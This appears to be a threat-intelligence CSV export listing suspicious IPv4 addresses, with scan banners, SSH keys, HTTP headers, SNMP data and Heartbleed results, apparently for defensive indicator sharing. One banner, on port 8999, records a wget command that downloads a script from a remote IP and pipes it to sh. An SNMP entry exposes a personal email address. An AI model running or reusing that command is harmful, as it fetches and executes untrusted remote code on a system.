"created_at","entity_type","objectLabel","objectMarking","observable_value","updated_at","value","x_opencti_description","x_opencti_score"
"2024-10-30T17:40:11.181Z","IPv4-Addr","cloud,scanner","TLP:CLEAR","165.232.139.26","2024-10-30T17:52:04.516Z","165.232.139.26","**ISP:** DigitalOcean, LLC

**OS:** -

--------------------------
Services:

**22:**
```
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
Key type: ecdsa-sha2-nistp256
Key: AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEoWFdla+gEiuonffHwN7aJI
jaDRkq36kgEpUCXn1XcKAR7VTvGeJqA9XZ7BAldH2gbpyRMEl2hp+pSMZMJm+00=
Fingerprint: 04:40:2c:12:f8:47:70:02:1f:c4:ac:a8:05:1a:8c:39

Kex Algorithms:
	curve25519-sha256
	curve25519-sha256@libssh.org
	ecdh-sha2-nistp256
	ecdh-sha2-nistp384
	ecdh-sha2-nistp521
	sntrup761x25519-sha512@openssh.com
	diffie-hellman-group-exchange-sha256
	diffie-hellman-group16-sha512
	diffie-hellman-group18-sha512
	diffie-hellman-group14-sha256
	kex-strict-s-v00@openssh.com

Server Host Key Algorithms:
	rsa-sha2-512
	rsa-sha2-256
	ecdsa-sha2-nistp256
	ssh-ed25519

Encryption Algorithms:
	chacha20-poly1305@openssh.com
	aes128-ctr
	aes192-ctr
	aes256-ctr
	aes128-gcm@openssh.com
	aes256-gcm@openssh.com

MAC Algorithms:
	umac-64-etm@openssh.com
	umac-128-etm@openssh.com
	hmac-sha2-256-etm@openssh.com
	hmac-sha2-512-etm@openssh.com
	hmac-sha1-etm@openssh.com
	umac-64@openssh.com
	umac-128@openssh.com
	hmac-sha2-256
	hmac-sha2-512
	hmac-sha1

Compression Algorithms:
	none
	zlib@openssh.com
```
------------------
**80:**
```
HTTP/1.1 200 OK
Date: Wed, 30 Oct 2024 10:51:27 GMT
Server: Apache/2.4.62 (Debian)
Last-Modified: Sun, 27 Oct 2024 16:29:30 GMT
ETag: ""29cd-62577db440c7b""
Accept-Ranges: bytes
Content-Length: 10701
Vary: Accept-Encoding
Content-Type: text/html
```
------------------
**81:**
```
HTTP/1.1 503 Service Temporarily Unavailable
Date: Mon, 30 Sep 2024 23:26:53 GMT
Content-Type: text/html
Content-Length: 1525
Connection: keep-alive
ETag: ""66f7624c-5f5""
```
------------------","50"
"2024-10-30T17:40:11.922Z","IPv4-Addr","","TLP:CLEAR","167.94.138.171","2024-10-30T17:40:11.940Z","167.94.138.171","binarydefense IP",""
"2024-10-30T17:40:12.580Z","IPv4-Addr","cloud","TLP:CLEAR","167.99.127.131","2024-10-30T17:52:23.421Z","167.99.127.131","**ISP:** DigitalOcean, LLC

**OS:** -

--------------------------
Services:

**22:**
```
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
Key type: ssh-rsa
Key: AAAAB3NzaC1yc2EAAAADAQABAAABAQC1GpVIUr2wh0uT+4xCdVs6RIfNMy4O+bYLqxwoWt4J8EMK
/Y+6/kZL0j29sBNyIKCwFH7fb+Cl2szM/S4dahIiOtAhA1adB0D2YBdDySbaah6bfulnr5XS1i/G
eIz9LY/Yc0kv601xPKbV/y6tg+nkOvGv/2EdOh8TK8Z0xRoQ4bAcb9Yb2LI/0sxfnxI2ypQht69H
0zVXhZoom3umQzfSfjPU2B3Rc/HPtOYHJi4AWg8CnakqN+9vzpE8QTaUFoYqfCQAYpNpJzT9Khzs
Lv+ID7Q67lzf88TOopqnPhsUlh4DfttOKdiret8a8W9NExs/s5S9pCbmANxd/C5OdTK9
Fingerprint: 22:27:ec:e6:2e:0e:ca:b8:cb:3b:de:ac:69:c1:27:ec

Kex Algorithms:
	curve25519-sha256
	curve25519-sha256@libssh.org
	ecdh-sha2-nistp256
	ecdh-sha2-nistp384
	ecdh-sha2-nistp521
	diffie-hellman-group-exchange-sha256
	diffie-hellman-group16-sha512
	diffie-hellman-group18-sha512
	diffie-hellman-group14-sha256
	diffie-hellman-group14-sha1

Server Host Key Algorithms:
	rsa-sha2-512
	rsa-sha2-256
	ssh-rsa
	ecdsa-sha2-nistp256
	ssh-ed25519

Encryption Algorithms:
	chacha20-poly1305@openssh.com
	aes128-ctr
	aes192-ctr
	aes256-ctr
	aes128-gcm@openssh.com
	aes256-gcm@openssh.com

MAC Algorithms:
	umac-64-etm@openssh.com
	umac-128-etm@openssh.com
	hmac-sha2-256-etm@openssh.com
	hmac-sha2-512-etm@openssh.com
	hmac-sha1-etm@openssh.com
	umac-64@openssh.com
	umac-128@openssh.com
	hmac-sha2-256
	hmac-sha2-512
	hmac-sha1

Compression Algorithms:
	none
	zlib@openssh.com
```
------------------
**123:**
```
NTP
protocolversion: 3
stratum: 0
leap: 3
precision: 0
rootdelay: 0.0
rootdisp: 0.0
refid: 1380013125
reftime: 0.0
poll: 3
```
------------------","50"
"2024-10-30T17:40:12.632Z","IPv4-Addr","","TLP:CLEAR","167.249.210.245","2024-10-30T17:40:12.741Z","167.249.210.245","binarydefense IP",""
"2024-10-30T17:40:13.203Z","IPv4-Addr","","TLP:CLEAR","172.168.157.141","2024-10-30T17:40:13.286Z","172.168.157.141","binarydefense IP",""
"2024-10-30T17:40:13.868Z","IPv4-Addr","cloud","TLP:CLEAR","173.255.230.31","2024-10-30T17:52:28.019Z","173.255.230.31","**ISP:** Akamai Connected Cloud

**OS:** Linux

--------------------------
Services:

**22:**
```
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
Key type: ecdsa-sha2-nistp256
Key: AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHpGfyxpFuKnFsIMpE66KhhL
8VS2hMJY2un9FNDxe8EUuOBF5j5mW4Y2OOK485/fv8zzJ6XhY382pD5jbEgaGF8=
Fingerprint: 01:9b:c2:e9:e8:4e:9c:70:6d:b5:02:7e:b7:f4:b0:81

Kex Algorithms:
	curve25519-sha256
	curve25519-sha256@libssh.org
	ecdh-sha2-nistp256
	ecdh-sha2-nistp384
	ecdh-sha2-nistp521
	sntrup761x25519-sha512@openssh.com
	diffie-hellman-group-exchange-sha256
	diffie-hellman-group16-sha512
	diffie-hellman-group18-sha512
	diffie-hellman-group14-sha256
	kex-strict-s-v00@openssh.com

Server Host Key Algorithms:
	rsa-sha2-512
	rsa-sha2-256
	ecdsa-sha2-nistp256
	ssh-ed25519

Encryption Algorithms:
	chacha20-poly1305@openssh.com
	aes128-ctr
	aes192-ctr
	aes256-ctr
	aes128-gcm@openssh.com
	aes256-gcm@openssh.com

MAC Algorithms:
	umac-64-etm@openssh.com
	umac-128-etm@openssh.com
	hmac-sha2-256-etm@openssh.com
	hmac-sha2-512-etm@openssh.com
	hmac-sha1-etm@openssh.com
	umac-64@openssh.com
	umac-128@openssh.com
	hmac-sha2-256
	hmac-sha2-512
	hmac-sha1

Compression Algorithms:
	none
	zlib@openssh.com
```
------------------","50"
"2024-10-30T17:40:13.913Z","IPv4-Addr","","TLP:CLEAR","172.206.146.170","2024-10-30T17:40:14.004Z","172.206.146.170","binarydefense IP",""
"2024-10-30T17:40:14.472Z","IPv4-Addr","","TLP:CLEAR","176.113.131.45","2024-10-30T17:40:14.529Z","176.113.131.45","binarydefense IP",""
"2024-10-30T17:40:15.879Z","IPv4-Addr","","TLP:CLEAR","177.75.63.106","2024-10-30T17:40:15.911Z","177.75.63.106","binarydefense IP",""
"2024-10-30T17:40:15.905Z","IPv4-Addr","","TLP:CLEAR","176.126.143.117","2024-10-30T17:40:15.971Z","176.126.143.117","binarydefense IP",""
"2024-10-30T17:40:16.620Z","IPv4-Addr","","TLP:CLEAR","177.97.201.43","2024-10-30T17:40:16.671Z","177.97.201.43","binarydefense IP",""
"2024-10-30T17:40:17.241Z","IPv4-Addr","","TLP:CLEAR","177.222.120.212","2024-10-30T17:40:17.317Z","177.222.120.212","binarydefense IP",""
"2024-10-30T17:40:17.262Z","IPv4-Addr","","TLP:CLEAR","177.240.28.234","2024-10-30T17:40:17.318Z","177.240.28.234","binarydefense IP",""
"2024-10-30T17:40:17.984Z","IPv4-Addr","","TLP:CLEAR","178.128.43.44","2024-10-30T17:40:18.081Z","178.128.43.44","binarydefense IP",""
"2024-10-30T17:40:18.351Z","IPv4-Addr","","TLP:CLEAR","181.115.214.96","2024-10-30T17:40:18.527Z","181.115.214.96","binarydefense IP",""
"2024-10-30T17:40:18.689Z","IPv4-Addr","","TLP:CLEAR","182.151.13.134","2024-10-30T17:52:32.361Z","182.151.13.134","**ISP:** CHINANET SiChuan Telecom Internet Data Center

**OS:** Linux

--------------------------
Services:

**22:**
```
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11
Key type: ssh-rsa
Key: AAAAB3NzaC1yc2EAAAADAQABAAABgQC2u46Asl4Q11p29xuv2cmaF9xa8Hyakvt/Y0wJOEArb6d2
ekno3lwIJRaWQ7fs6ZzgESVFVsxaiCAO3zWLLPWWkU8nAosEn/EHuf5vo4InbzfH6+crInKHgCnV
TMibBlP8ieT/OX8S6welF7NBaFyvGJrBENzqcOwnZlIccYpnPf2Bshk87Vu7/jiN13vwUifPJaTs
xz2+2Xid9dWouf/nTdCp0dbnD9+b3IvKs9RbL3cpwlQTvqfoYZUpjqWUtVlUQ3UtXeCunb2/a4J0
6KTeDPIZVYmpoG1OC4+IIFPjl0FVzh2rgcwK/W2WBJmpm8XEq/HQ/1DsRwgaz0B/orXGNAUHHnOy
ZS4TJW3orw58x8B5xWZgNaZ+p5CbvsxutoliOFws/2+YE1nTmhMsu/12RbwGtx2E05xQUg4y9ETF
pqPfHVfvvv9zp3qoSn9bAuEIenTmWUWYTVdzzoDAeXBnCX78zby6W6TnF/om+hkfDSjqVzli1u8s
geqAosYsAJ0=
Fingerprint: 2b:9e:64:f1:d4:1b:05:e6:ef:e5:15:9e:57:34:3b:38

Kex Algorithms:
	curve25519-sha256
	curve25519-sha256@libssh.org
	ecdh-sha2-nistp256
	ecdh-sha2-nistp384
	ecdh-sha2-nistp521
	diffie-hellman-group-exchange-sha256
	diffie-hellman-group16-sha512
	diffie-hellman-group18-sha512
	diffie-hellman-group14-sha256
	kex-strict-s-v00@openssh.com

Server Host Key Algorithms:
	rsa-sha2-512
	rsa-sha2-256
	ssh-rsa
	ecdsa-sha2-nistp256
	ssh-ed25519

Encryption Algorithms:
	chacha20-poly1305@openssh.com
	aes128-ctr
	aes192-ctr
	aes256-ctr
	aes128-gcm@openssh.com
	aes256-gcm@openssh.com

MAC Algorithms:
	umac-64-etm@openssh.com
	umac-128-etm@openssh.com
	hmac-sha2-256-etm@openssh.com
	hmac-sha2-512-etm@openssh.com
	hmac-sha1-etm@openssh.com
	umac-64@openssh.com
	umac-128@openssh.com
	hmac-sha2-256
	hmac-sha2-512
	hmac-sha1

Compression Algorithms:
	none
	zlib@openssh.com
```
------------------","50"
"2024-10-30T17:40:19.371Z","IPv4-Addr","self-signed","TLP:CLEAR","185.15.171.139","2024-10-30T17:52:35.441Z","185.15.171.139","**ISP:** METIS S.R.L.

**OS:** Ubiquiti AirOS

--------------------------
Services:

**80:**
```
HTTP/1.1 302 Found
Location: https://185.15.171.139/
Content-Length: 0
Date: Mon, 27 May 2024 08:59:47 GMT
Server: lighttpd/1.4.39
```
------------------
**443:**
```
HTTP/1.1 404 Not Found
Set-Cookie: AIROS_44D9E74E3813=036e6317416e4f7763b32b666130dc2f; Path=/; Version=1
Content-Type: text/html
Content-Length: 1027
Date: Mon, 20 May 2024 09:38:29 GMT
Server: lighttpd/1.4.39
```
HEARTBLEED: 2024/10/12 13:08:29 185.15.171.139:443 - ERROR: tls: failed to parse certificate from server: x509: negative serial number

------------------
**8080:**
```
HTTP/1.1 404 Not Found
Set-Cookie: AIROS_3C640B1CBDF7=36ccdc08bdf26bc6ae0ab779162bacba; Path=/; Version=1
Content-Type: text/html
Content-Length: 1027
Date: Mon, 27 May 2024 17:30:20 GMT
Server: lighttpd/1.4.39
```
------------------
**8081:**
```
HTTP/1.1 200 OK
Date: Thu, 10 Oct 2024 22:21:30 GMT
Server: Boa/0.94.14rc21
Accept-Ranges: bytes
Connection: Keep-Alive
Keep-Alive: timeout=10, max=1000
Content-Length: 963
Last-Modified: Thu, 18 Feb 2016 02:15:21 GMT
Content-Type: text/html

<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Strict//EN"">
<html>
	<head>
		<meta name=""viewport"" content=""width=device-width; initial-scale=1.0""/>
		<title>
			</title>
	</head>

   <SCRIPT LANGUAGE=""JavaSCRIPT"">
   function msieversion()
   {
      var ua = window.navigator.userAgent;
      var msie = ua.indexOf ( ""MSIE "" );

      if ( msie > 0 )      // If Internet Explorer, return version number
         return parseInt (ua.substring (msie+5, ua.indexOf (""."", msie )));
      else {
         // IE11 remove string ""MSIE"" in userAgent
         if (window.ActiveXObject !== undefined)
            return 11;
         else              // If another browser, return 0
            return 0;
      }

   }
   </SCRIPT>
   
  <SCRIPT LANGUAGE=""javascript"">
   if ( msieversion() >= 3 )
      window.location = 'ie.htm';
   else
      window.location = 'wap.htm';
     //document.write ( ""This is another browser"" );

   </SCRIPT>
     
	<body>

	</body>
</html>
```
------------------","50"
"2024-10-30T17:40:19.424Z","IPv4-Addr","scanner","TLP:CLEAR","185.191.126.248","2024-10-30T17:52:43.991Z","185.191.126.248","**ISP:** Amarutu Technology Ltd

**OS:** -

--------------------------
Services:

**80:**
```
HTTP/1.1 200 OK
Date: Tue, 22 Oct 2024 19:25:15 GMT
Server: Apache/2.4.59 (Debian)
Last-Modified: Sun, 10 Mar 2024 03:31:11 GMT
ETag: ""29cd-613460e753f8d""
Accept-Ranges: bytes
Content-Length: 10701
Vary: Accept-Encoding
Content-Type: text/html
```
------------------
**111:**
```
Portmap
Program	Version	Protocol	Port
portmapper	4	tcp	111
portmapper	3	tcp	111
portmapper	2	tcp	111
portmapper	4	udp	111
portmapper	3	udp	111
portmapper	2	udp	111
mountd	1	udp	35166
mountd	1	tcp	48563
mountd	2	udp	57513
mountd	2	tcp	36591
mountd	3	udp	44175
mountd	3	tcp	44619
nfs	3	tcp	2049
nfs	4	tcp	2049
100227	3	tcp	2049
nfs	3	udp	2049
100227	3	udp	2049
nlockmgr	1	udp	58247
nlockmgr	3	udp	58247
nlockmgr	4	udp	58247
nlockmgr	1	tcp	42041
nlockmgr	3	tcp	42041
nlockmgr	4	tcp	42041
```
------------------
**8999:**
```
wget -O- http://103.149.87.69/scripts/gocl|sh
```
------------------","50"
"2024-10-30T17:40:20.863Z","IPv4-Addr","","TLP:CLEAR","185.196.11.195","2024-10-30T17:53:03.349Z","185.196.11.195","**ISP:** Global-Data System IT Corporation

**OS:** Ubuntu

--------------------------
Services:

**22:**
```
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
Key type: ssh-rsa
Key: AAAAB3NzaC1yc2EAAAADAQABAAABgQDwSOk5YGDn6VNhvM6YsRvZ8nTT1O3aYpwIEb6/uUbhMXiK
fmEKpckZejmkO2ECYwrmhBT3/ZnWLoRXpHLmV7NCiaK5MaZuWr8tZ7cI8w5Ej6cZJ/bbRznQKYU4
pQRKhccwgIaAlyoNg+0T0Xc/LMfIP/hlEaYomWACz6j86sRZ+pj5bjs5ea96C/Yxe47G2Xur5oUA
ePD+GyDWhV3SmtAEz32EscDzviCOR1fwtVBKnh9rZrwBOyD1UgjKjqzV1cEWRrRY1ndAYOT9EhoW
Iyc8MfO/JDFaHO7R0pE4NxAPiwv+SNBg3MnBK1FT8Rv0fZ5zOwDtknWULAuhWYl8RRjolLA0gK0L
wRYMfSpdweKnlWepnEUqwQW8i4cEiMDmcWUSe2EgVGf1LfXCRPNeauSkHxkm6ioCtz2J4wIfOvVp
48sqor7bulMntEYu1/9u8HOJ1tBcY5rv4TQeHdAfDlUOQB7L/vdPJdsO3K6jnj901KC/aDh+T68h
Vi7uWzgyMYk=
Fingerprint: 77:23:72:22:fd:13:69:3f:94:54:d9:3e:fd:c2:83:67

Kex Algorithms:
	curve25519-sha256
	curve25519-sha256@libssh.org
	ecdh-sha2-nistp256
	ecdh-sha2-nistp384
	ecdh-sha2-nistp521
	diffie-hellman-group-exchange-sha256
	diffie-hellman-group16-sha512
	diffie-hellman-group18-sha512
	diffie-hellman-group14-sha256

Server Host Key Algorithms:
	rsa-sha2-512
	rsa-sha2-256
	ssh-rsa

Encryption Algorithms:
	chacha20-poly1305@openssh.com
	aes128-ctr
	aes192-ctr
	aes256-ctr
	aes128-gcm@openssh.com
	aes256-gcm@openssh.com

MAC Algorithms:
	umac-64-etm@openssh.com
	umac-128-etm@openssh.com
	hmac-sha2-256-etm@openssh.com
	hmac-sha2-512-etm@openssh.com
	hmac-sha1-etm@openssh.com
	umac-64@openssh.com
	umac-128@openssh.com
	hmac-sha2-256
	hmac-sha2-512
	hmac-sha1

Compression Algorithms:
	none
	zlib@openssh.com
```
------------------
**80:**
```
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Tue, 08 Oct 2024 13:04:16 GMT
Content-Type: text/html
Content-Length: 162
Connection: keep-alive
Location: http://185.196.10.221
```
------------------","50"
"2024-10-30T17:40:20.891Z","IPv4-Addr","","TLP:CLEAR","186.54.188.4","2024-10-30T17:40:21.226Z","186.54.188.4","binarydefense IP",""
"2024-10-30T17:40:21.637Z","IPv4-Addr","","TLP:CLEAR","187.156.25.11","2024-10-30T17:40:21.741Z","187.156.25.11","binarydefense IP",""
"2024-10-30T17:40:22.253Z","IPv4-Addr","","TLP:CLEAR","190.108.228.147","2024-10-30T17:53:07.986Z","190.108.228.147","**ISP:** Neunet S.A.

**OS:** -

--------------------------
Services:

**7547:**
```
HTTP/1.1 404 Not Found
Date: Tue Oct 15 17:49:55 2024
Server: tr069 http server
Content-Length: 15
Connection: close
Content-Type: text/plain; charset=ISO-8859-1
```
------------------
**8080:**
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 22620
Connection: keep-alive
```
------------------","50"
"2024-10-30T17:40:22.268Z","IPv4-Addr","","TLP:CLEAR","196.203.24.180","2024-10-30T17:53:14.317Z","196.203.24.180","**ISP:** 3S INF

**OS:** -

--------------------------
Services:

**22:**
```
SSH-2.0-ElzZmPaaU3PtM82
Key type: ssh-rsa
Key: AAAAB3NzaC1yc2EAAAADAQABAAABAQDt99NJ6JF+CjLhCfJdrshNcCjxcVM4zxomUrwkLG1Di2J5
Lh/DlqIS6mIvBOm4npv2FOwXiE30Ns3tI1aXza+xoIrusYFGQzMKqSQiRPvy0g5vnk2HGmOyjeIN
/FCQ5PGcWgjkSE5PSH/P+0a2UWWBv1VN1OGC7XwECRRxBKBb6TaS+6gC9X4vIEDM7dD2e+Sb2N3o
AguD6aM8v6CPJlh6Qik0/2bM8+/zjMLmxAEh+FyQ4Bi0xDLFSRL6sYpWpmQEW0qlFNGrKZbOhJs+
g9yCcJQ4G1NMWNGZ39BmFTH4O5I1xAriiYppycaSQBdD2xBSoj67s+zgdytDOf3vPMfd
Fingerprint: e3:ba:e5:aa:87:90:4f:79:fc:b0:0e:bf:ec:8a:8b:c1

Kex Algorithms:
	curve25519-sha256@libssh.org
	diffie-hellman-group-exchange-sha256
	diffie-hellman-group-exchange-sha1
	diffie-hellman-group14-sha1

Server Host Key Algorithms:
	ssh-rsa
	ssh-ed25519

Encryption Algorithms:
	chacha20-poly1305@openssh.com
	aes128-ctr
	aes192-ctr
	aes256-ctr

MAC Algorithms:
	umac-64-etm@openssh.com
	umac-128-etm@openssh.com
	hmac-sha2-256-etm@openssh.com
	hmac-sha2-512-etm@openssh.com
	hmac-sha1-etm@openssh.com
	umac-64@openssh.com
	umac-128@openssh.com
	hmac-sha2-256
	hmac-sha2-512
	hmac-sha1
	hmac-ripemd160-etm@openssh.com
	hmac-ripemd160
	hmac-ripemd160@openssh.com

Compression Algorithms:
	none
	zlib@openssh.com
```
------------------
**161:**
```
SNMP:
  Uptime: 2646876952
  Description: SNMP firewall
  Service: 78
  Versions:
    1
  Contact: bendhiefbassem@outlook.fr
  Oruptime: 0
  Location: TUNIS
  Orindex: 1
  Objectid: 1.3.6.1.4.1.12356.101.1.2010
  Orid: 0.0.0
  Name: FGT_MASTER
```
------------------","50"
"2024-10-30T17:40:22.959Z","IPv4-Addr","","TLP:CLEAR","197.17.33.23","2024-10-30T17:53:19.242Z","197.17.33.23","**ISP:** OOREDOO TUNISIE SA

**OS:** -

--------------------------
Services:

**123:**
```
NTP
protocolversion: 3
stratum: 0
leap: 3
precision: -16
rootdelay: 0.0
rootdisp: 1.52587890625e-05
refid: 0
reftime: 0.0
poll: 0
```
------------------","50"
"2024-10-30T17:40:23.604Z","IPv4-Addr","","TLP:CLEAR","201.150.7.234","2024-10-30T17:40:23.631Z","201.150.7.234","binarydefense IP",""
"2024-10-30T17:40:23.631Z","IPv4-Addr","self-signed","TLP:CLEAR","202.65.142.139","2024-10-30T17:53:23.928Z","202.65.142.139","**ISP:** Pioneer Elabs Ltd.

**OS:** -

--------------------------
Services:

**53:**
```
unbound 1.4.22
Recursion: enabled
Resolver name: STA_INTERNET_PIONEER
Resolver ID: STA_INTERNET_PIONEER
```
------------------
**53:**
```
unbound 1.4.22
Recursion: enabled
Resolver name: STA_INTERNET_PIONEER
Resolver ID: STA_INTERNET_PIONEER
```
------------------
**80:**
```
HTTP/1.1 200 OK
Server: openresty
Date: Mon, 28 Oct 2024 14:08:42 GMT
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Mon, 28 Oct 2024 14:08:42 GMT
Last-Modified: Mon, 28 Oct 2024 14:08:42 GMT
Cache-Control: no-store, no-cache, must-revalidate
Accept-Ranges: none
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
```
------------------
**161:**
```
SNMP:
  Versions:
    3
  Engineid Format: mac
  Engine Boots: 63
  Engineid Data: 08:4f:a9:55:07:f0
  Enterprise: 9
  Engine Time: 170 days, 14:02:26
```
------------------
**443:**
```
HTTP/1.1 200 OK
Server: openresty
Date: Wed, 23 Oct 2024 04:24:06 GMT
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Wed, 23 Oct 2024 04:24:06 GMT
Last-Modified: Wed, 23 Oct 2024 04:24:06 GMT
Cache-Control: no-store, no-cache, must-revalidate
Accept-Ranges: none
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=7884000
```
HEARTBLEED: 2024/10/23 04:13:51 202.65.142.139:443 - SAFE

------------------","50"
"2024-10-30T17:40:24.558Z","IPv4-Addr","eol-product,vpn","TLP:CLEAR","202.111.131.240","2024-10-30T17:53:31.211Z","202.111.131.240","**ISP:** CHINA UNICOM China169 Backbone

**OS:** -

--------------------------
Services:

**53:**
```

```
------------------
**53:**
```
Recursion: enabled
```
------------------
**81:**
```
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Mon, 28 Oct 2024 04:10:57 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 283065
Connection: keep-alive
Vary: Accept-Encoding
ETag: ""451b9-ox2c9Uu/2CmZEZN0ZVTVbchEyAw""
Accept-Ranges: none
Vary: Accept-Encoding
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
Cross-Origin-Resource-Policy: same-site
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```
------------------
**500:**
```
VPN (IKE)

Initiator SPI: 6f6a73367a326c78
Responder SPI: 74386b366b7a6663
Next Payload: RESERVED
Version: 2.0
Exchange Type: DOI Specific Use
Flags:
    Encryption:     False
    Commit:         False
    Authentication: False
Message ID: 00000000
Length: 36
```
------------------
**1515:**
```
HTTP/1.1 400 Bad Request
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Tue, 29 Oct 2024 13:32:06 GMT
Connection: close
Content-Length: 326

<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01//EN""""http://www.w3.org/TR/html4/strict.dtd"">
<HTML><HEAD><TITLE>Bad Request</TITLE>
<META HTTP-EQUIV=""Content-Type"" Content=""text/html; charset=us-ascii""></HEAD>
<BODY><h2>Bad Request - Invalid Verb</h2>
<hr><p>HTTP Error 400. The request verb is invalid.</p>
</BODY></HTML>
```
------------------
**1701:**
```
\xc8\x02\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x01
```
------------------
**1723:**
```
PPTP:
  Firmware: 1
  Hostname: local
  Vendor: linux
```
------------------
**2008:**
```
HTTP/1.1 400 Bad Request
Server: nginx/1.23.4
Date: Tue, 29 Oct 2024 19:53:50 GMT
Content-Type: text/html
Content-Length: 657
Connection: close
```
------------------
**3000:**
```
HTTP/1.1 400 Bad Request
Server: nginx/1.19.0
Date: Fri, 11 Oct 2024 15:03:44 GMT
Content-Type: text/html
Content-Length: 657
Connection: close
```
------------------
**3002:**
```
HTTP/1.1 404 
Content-Length: 0
Date: Sat, 19 Oct 2024 15:16:01 GMT
```
------------------
**6666:**
```
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 04 Apr 2016 12:40:00 GMT
Accept-Ranges: bytes
ETag: ""a0da4f1a6f8ed11:0""
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Fri, 25 Oct 2024 02:23:30 GMT
Content-Length: 689
```
------------------
**9876:**
```
HTTP/1.1 400 Bad Request
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Sat, 26 Oct 2024 11:20:49 GMT
Connection: close
Content-Length: 326

<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01//EN""""http://www.w3.org/TR/html4/strict.dtd"">
<HTML><HEAD><TITLE>Bad Request</TITLE>
<META HTTP-EQUIV=""Content-Type"" Content=""text/html; charset=us-ascii""></HEAD>
<BODY><h2>Bad Request - Invalid Verb</h2>
<hr><p>HTTP Error 400. The request verb is invalid.</p>
</BODY></HTML>
```
------------------","50"
"2024-10-30T17:40:24.930Z","IPv4-Addr","","TLP:CLEAR","202.179.76.65","2024-10-30T17:40:24.965Z","202.179.76.65","binarydefense IP",""
"2024-10-30T17:40:24.930Z","IPv4-Addr","","TLP:CLEAR","202.125.150.236","2024-10-30T17:53:50.403Z","202.125.150.236","**ISP:** Pakistan Telecommunication Company Limited

**OS:** -

--------------------------
Services:

**23:**
```
User Access Verification

Password:
```
HEARTBLEED: 2024/10/27 23:39:49 202.125.150.236:23 - ERROR: tls: oversized record received with length 65531

------------------","50"
